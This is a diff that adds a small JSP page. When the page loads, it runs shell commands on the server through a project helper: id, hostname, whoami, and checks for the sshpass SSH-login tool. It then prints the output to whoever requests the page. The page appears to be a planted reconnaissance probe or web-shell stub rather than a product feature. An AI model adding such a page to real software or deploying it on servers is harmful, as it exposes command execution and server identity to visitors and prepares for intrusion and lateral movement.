@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+<jsp:scriptlet>
+String[] c = new String[]{"/usr/bin/id","/bin/hostname","/usr/bin/whoami","/usr/bin/which sshpass","/usr/local/bin/sshpass -V"};
+java.util.Map m = com.boxin.util.LinuxStateForShell.runLocalShell(c);
+out.print("LOCAL=" + m);
+</jsp:scriptlet>
+</jsp:root>
